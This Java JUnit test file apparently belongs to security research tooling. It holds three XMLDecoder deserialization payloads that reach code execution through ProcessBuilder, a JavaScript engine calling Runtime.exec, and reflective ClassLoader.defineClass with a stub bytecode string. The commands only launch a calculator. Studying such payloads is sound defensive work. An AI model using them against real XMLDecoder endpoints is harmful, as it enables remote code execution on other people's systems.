import org.junit.jupiter.api.Test;

import java.beans.XMLDecoder;
import java.io.ByteArrayInputStream;

/**
 * @author ReaJason
 * @since 2025/7/3
 */
class XmlDecoderServletTest {

    @Test
    void test() {
        String xml = "<java>" +
                "    <object class=\"java.lang.ProcessBuilder\">\n" +
                "        <array class=\"java.lang.String\" length=\"1\" >\n" +
                "            <void index=\"0\">\n" +
                "                <string>Calculator</string>\n" +
                "            </void>\n" +
                "        </array>\n" +
                "        <void method=\"start\"/>\n" +
                "    </object>\n" +
                "</java>";
        String xml1 = "<java>" +
                "    <object class=\"javax.script.ScriptEngineManager\">\n" +
                "        <void method=\"getEngineByName\">\n" +
                "            <string>js</string>\n" +
                "            <void method=\"eval\">\n" +
                "                <string>java.lang.Runtime.getRuntime().exec('open -a Calculator')</string>\n" +
                "            </void>\n" +
                "        </void>\n" +
                "    </object>\n" +
                "</java>";
        String xml2 = "<java>\n" +
                "    <object class=\"javax.xml.bind.DatatypeConverter\" method=\"parseBase64Binary\" id=\"byteCode\">\n" +
                "        <string>aGVsbG8K></string>\n" +
                "    </object>\n" +
                "    <class id=\"classLoaderClazz\">java.lang.ClassLoader</class>\n" +
                "    <void idref=\"classLoaderClazz\">\n" +
                "        <void method=\"getDeclaredMethod\" id=\"defineClass\">\n" +
                "            <string>defineClass</string>\n" +
                "            <array class=\"java.lang.Class\" length=\"3\">\n" +
                "                <void index=\"0\"><class>[B</class></void>\n" +
                "                <void index=\"1\"><class>int</class></void>\n" +
                "                <void index=\"2\"><class>int</class></void>\n" +
                "            </array>\n" +
                "            <void method=\"setAccessible\"><boolean>true</boolean></void>\n" +
                "        </void>\n" +
                "    </void>\n" +
                "</java>";
        try {
            ByteArrayInputStream inputStream = new ByteArrayInputStream(xml2.getBytes());
            XMLDecoder xmlDecoder = new XMLDecoder(inputStream);
            xmlDecoder.readObject();
            xmlDecoder.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}